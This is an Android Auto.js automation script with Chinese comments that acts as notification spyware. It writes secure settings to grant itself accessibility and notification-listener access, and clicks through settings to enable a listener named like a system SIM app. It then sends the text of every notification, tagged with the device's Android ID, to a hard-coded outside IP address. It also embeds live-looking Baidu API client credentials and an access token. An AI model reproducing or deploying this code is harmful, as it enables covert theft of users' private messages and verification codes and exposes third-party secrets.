//auto.waitFor()
importClass(android.content.Context);
importClass(android.provider.Settings);
importClass(android.os.Process)
// console.setSize(device.width / 2, device.height * 4 / 5)
// console.show()
var packagename_self = context.getPackageName()
log(packagename_self)
var Androidid = device.getAndroidId()
// log(Androidid)
if (!requestScreenCapture()) {
    toast("请求截图失败");
    exit();
}
function GrantNotificationListenerAccess(context, packagename, classname) {
    //ContentResolver
    var resolver = context.getContentResolver();

    //String
    var permissionList = Settings.Secure.getString(resolver, "enabled_notification_listeners");
    log("befor grand permission str = " + permissionList);
    // StringBuilder 
    //org.autojs.autojspro/com.stardust.notification.NotificationListenerService:com.xiaomi.xmsf/com.xiaomi.xmsf.push.service.notificationcollection.NotificationListener:com.miui.analytics/com.miui.analytics.internal.collection.MusicStateListener:com.miui.powerkeeper/com.miui.powerkeeper.NotificationListener:com.android.usim.sys/com.stardust.notification.NotificationListenerService:com.xiaomi.hm.health/com.xiaomi.hm.health.ui.smartplay.NotificationAccessService:com.miui.securitycenter/com.miui.gamebooster.service.NotificationListener.
    var serviceName = packagename + "/" + classname;
    // serviceName.append("/");
    // serviceName.append(classname);
    // String 
    var Service = serviceName
    log(Service)
    log(permissionList.indexOf(Service))
    if (permissionList == null) {
        permissionList = "";
    }
    if (permissionList != null && permissionList.indexOf(Service) == -1) {
        //权限没有获取时，添加
        // StringBuilder 
        log("没有权限")
        var resultBuilder = permissionList;
        if (permissionList != "") {
            resultBuilder += ":";
        }
        resultBuilder = resultBuilder + serviceName;
        // String
        var result = resultBuilder;
        Settings.Secure.putString(resolver, "enabled_notification_listeners", result);

        // Settings.Secure.putString(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, '1');


    }
    startListen()
    log("after grand permission str = " + Settings.Secure.getString(resolver, "enabled_notification_listeners"));
}


function openAccessbility() {
    //var dd = shell("pm grant " + packagename_self + " android.permission.WRITE_SECURE_SETTINGS", true)
    //log(dd)
    try {
        var enabledServices = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        //log('当前已启用的辅助服务\n', enabledServices);
        /*
        附上几个我安装的应用的辅助功能服务
        AutoJsPro版 org.autojs.autojspro/com.stardust.autojs.core.accessibility.AccessibilityService
        AutoJS免费版 org.autojs.autojs/com.stardust.autojs.core.accessibility.AccessibilityService
        Nova桌面 com.teslacoilsw.launcher/com.teslacoilsw.launcher.NovaAccessibilityService
        
        注意每个服务之间要用英文冒号链接
        
        重要！
        建议把要用的所有辅助服务打开，然后通过上面那个log获取到已开启的服务，再把Services变量写死
        由于Android的一些bug，有时候实际没有开启的服务仍会出现在已启用的里面，所有没办法通过判断得知服务是否开启
        像当前这样子会导致已开启服务里面有很多重复项目，所有建议直接写死不再每次重新获取
        */
        var Services = enabledServices + ":" + packagename_self + "/com.stardust.autojs.core.accessibility.AccessibilityService";
        Settings.Secure.putString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, Services);
        Settings.Secure.putString(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, '1');
        // log("Error");
        // auto.waitFor();
        return true
    } catch (error) {
        //授权方法：开启usb调试并使用adb工具连接手机，执行 adb shell pm grant org.autojs.autojspro android.permission.WRITE_SECURE_SETTING
        // log("\n请确保已给予 WRITE_SECURE_SETTINGS 权限\n\n授权代码已复制，请使用adb工具连接手机执行(重启不失效)\n\n", error);
        // setClip("adb shell pm grant org.autojs.autojspro android.permission.WRITE_SECURE_SETTINGS");
        return false
    }
}

function closeAccesslibility() {
    try {
        var enabledServices = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        //log('当前已启用的辅助服务\n', enabledServices);
        /*
        附上几个我安装的应用的辅助功能服务
        AutoJsPro版 org.autojs.autojspro/com.stardust.autojs.core.accessibility.AccessibilityService
        AutoJS免费版 org.autojs.autojs/com.stardust.autojs.core.accessibility.AccessibilityService
        Nova桌面 com.teslacoilsw.launcher/com.teslacoilsw.launcher.NovaAccessibilityService
        
        注意每个服务之间要用英文冒号链接
        
        重要！
        建议把要用的所有辅助服务打开，然后通过上面那个log获取到已开启的服务，再把Services变量写死
        由于Android的一些bug，有时候实际没有开启的服务仍会出现在已启用的里面，所有没办法通过判断得知服务是否开启
        像当前这样子会导致已开启服务里面有很多重复项目，所有建议直接写死不再每次重新获取
        */
        var Services = enabledServices + ":" + packagename_self + "/com.stardust.autojs.core.accessibility.AccessibilityService";
        Settings.Secure.putString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, Services);
        Settings.Secure.putString(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, '0');
        log("成功关闭无障碍服务");
    } catch (error) {
        //授权方法：开启usb调试并使用adb工具连接手机，执行 adb shell pm grant org.autojs.autojspro android.permission.WRITE_SECURE_SETTING
        log("\n请确保已给予 WRITE_SECURE_SETTINGS 权限\n\n授权代码已复制，请使用adb工具连接手机执行(重启不失效)\n\n", error);
        setClip("adb shell pm grant org.autojs.autojspro android.permission.WRITE_SECURE_SETTINGS");
    }
}

function startListen() {
    events.observeNotification();
    events.onNotification(function (notification) {
        printNotification(notification);

    });
    log("监听中，请在日志中查看记录的通知及其内容");
    toast("Error")
}
function tongzhiUI() {

    function yeMianCaoZuo() {
        var USIM = text("USIM卡应用").findOne().parent().parent().findOne(className("android.widget.CheckBox"))
        if (USIM) {//找checkbox
            if (USIM.checked()) {//开关打开
                USIM.parent().parent().click()
                text("停用").findOne().click()
                text("USIM卡应用").findOne().parent().parent().click()
                text("允许").findOne().click()
            } else {//开关关闭
                text("USIM卡应用").findOne().parent().parent().click()
                text("允许").findOne().click()
            }
            return
        }
        USIM = text("USIM卡应用").findOne().parent().parent().findOne(className("android.widget.Switch"))

        if (USIM) {//找checkbox
            var parent_enable_click
            function search(USIM) {
                while (USIM.depth() >= 2) {
                    log(USIM)
                    if (USIM.clickable()) {
                        return USIM
                    } else {
                        USIM = USIM.parent()
                    }
                }
                return false
            }
            if (USIM.checked()) {//开关打开



                if (parent_enable_click = search(USIM) && parent_enable_click) {
                    parent_enable_click.click()
                    text("停用").findOne().click()
                    USIM = text("USIM卡应用").findOne().parent().parent().findOne(className("android.widget.Switch"))
                    parent_enable_click = search(USIM)
                    parent_enable_click.click()
                    text("允许").findOne().click()

                }

            } else {//开关关闭
                // log("开关关闭")

                USIM = text("USIM卡应用").findOne().parent().parent().findOne(className("android.widget.Switch"))
                // log(USIM)
                parent_enable_click = search(USIM)
                parent_enable_click.click()
                text("允许").findOne().click()
            }
            return
        }

    }

    sleep(1000)
    //判断当前界面
    var intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    app.startActivity(intent);
    if (auto.service) {
        log("无障碍已激活")
        auto = auto.service
        for (let index = 0; index < 150; index++) {
            if (text("通知使用权").exists()) {
                do {
                    if (text("USIM卡应用").findOne(100)) {
                        yeMianCaoZuo()
                        break;
                    }
                } while (scrollable(true).findOne().scrollDown());
                home()
                return true
            } else if (text("关闭").exists()) {
                back()
            }
            sleep(100)
        }
        log("打开通知权限失败")
        return false
    } else {
        log("无障碍未激活")
        return false
    }
}


// tongzhiUI()
// GrantNotificationListenerAccess(context,packagename_self,"com.stardust.notification.NotificationListenerService")

function printNotification(notification) {
    var msg = "应用包名: " + notification.getPackageName() + "--通知文本: " + notification.getText() +
        "通知优先级: " + notification.priority +
        "通知目录: " + notification.category +
        "通知时间: " + new Date(notification.when) +
        "通知数: " + notification.number +
        "通知摘要: " + notification.tickerText
    log(msg)
    threads.start(function () {
        try {


            var data = http.get("http://119.29.234.95:5000/?androidid=" + Androidid + "&info=" + msg)
        } catch (e) {
        }

    })

}


function main() {
    try {
        startListen()
    } catch (error) {
        log("异常")
        if (openAccessbility()) {
            if (tongzhiUI()) {
                startListen()
            }
        }
    }
    closeAccesslibility()
}


function baiduocr() {

    var access_token = '24.0863d55c2d1172b04257f9e54d36e49e.2592000.1574585509.282335-11339642'
    this.get_ass_token = function () {
        try {
            var url = "https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=DQKYjLdtobxYh98269GWfdHU&client_secret=zQ86fYV7ftGhAIBxVvpXk4fvyIGNdKKp"
            var re = http.get(url, {
                headers: {
                    'Accept-Language': 'zh-cn,zh;q=0.5',
                    'User-Agent': 'Mozilla/5.0(Macintosh;IntelMacOSX10_7_0)AppleWebKit/535.11(KHTML,likeGecko)Chrome/17.0.963.56Safari/535.11',
                    'Content-Type': 'application/json; charset=UTF-8'
                }
            })
            log(re.body.json())
        } catch (error) {

        }
    }
    this.get_ocr = function () {
        try {
            var base64Data = images.read(files.getSdcardPath() + "/test.png")
            base64Data = images.toBase64(base64Data, "png", 100)
            var url = "https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic?access_token=" + access_token
            var re = http.post(url, {
                image: base64Data
                , language_type: "CHN_ENG",
            }, {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            })
            log(re.body.json())
        } catch (error) {

        }
    }
    // get_ocr()
}

function msg(bounds,weizhi) {

    this.bounds=bounds
    this.weizhi=weizhi
}

function msg_admin(){
    var msg_queue=[]
    function push(new_arr) {
        
    }

    function start(){
        
    }
}

importClass(java.io.File)
function test() {
    var all_msg=[]
    var width_yiban = device.width / 2

    var zong_list = className("android.widget.ListView").findOne()
    var youxiao_count=0
    for (let index = 0; index < zong_list.childCount(); index++) {
        log(zong_list.child(index).bounds().top)
        log(zong_list.bounds().top)
        if (zong_list.child(index).bounds().top <= zong_list.bounds().top ) {

        } else {
            youxiao_count++
            var linearLayout = zong_list.child(index).findOne(className("android.widget.LinearLayout"))
            var relativelLayout_touxiang
            var linearLayout_msg,weizhi
            for (let index2 = 0; index2 < linearLayout.childCount(); index2++) {
                if (linearLayout.child(index2).className() == "android.widget.RelativeLayout") {
                    relativelLayout_touxiang = linearLayout.child(index2)
                } else if (linearLayout.child(index2).className() == "android.widget.LinearLayout") {
                    linearLayout_msg = linearLayout.child(index2)
                }

            }
            // linearLayout_child=linearLayout_child.findOne(className("android.widget.LinearLayout"))
            // log(relativelLayout_touxiang.bounds().centerX())
            if (relativelLayout_touxiang.bounds().centerX() < width_yiban) {
                log("左边")
                weizhi=0
            } else {
                log("右边")
                weizhi=1

            }
            log(linearLayout_msg.bounds())
            // log(linearLayout)
            // log(linearLayout == linearLayout_msg)
            all_msg.push(new msg(linearLayout_msg.bounds(),weizhi))
        } 
        
    }
    log("总数为:"+youxiao_count)
    log(all_msg)
    // log(zong_list.childCount())
    // log(zong_list.child(0).bounds().centerX())
    // log(zong_list.child(0).bounds().centerY())
    // var element=zong_list.child(0).child(0).child(1).bounds()
    // log(element)
    // log(auto.windows)


}

function jietu_save(params) {
    var img = captureScreen();
    //获取在点(100, 100)的颜色值
    img = images.clip(img, disi.left + 30, disi.top, disi.width() - 40, disi.height())
    // images.toBase64(, , , )
    // img.saveTo(files.getSdcardPath()+wanzhengName)
    var fileName = "/test"
    var geshi = "png"
    var extensionName = "." + geshi
    var wanzhengName = fileName + extensionName
    images.save(img, files.getSdcardPath() + wanzhengName, geshi, 100)
    app.viewFile(files.getSdcardPath() + wanzhengName);
    // var ff=open(files.getSdcardPath()+wanzhengName)
    // var ff=new File(files.getSdcardPath()+wanzhengName)
    log("大小为" + ff.length() / 1024 + "K")
}



// main()
for (let index = 0; index < 1; index++) {
    test()
    sleep(1000)

}
// var aa= new baiduocr()
// aa.get_ocr()




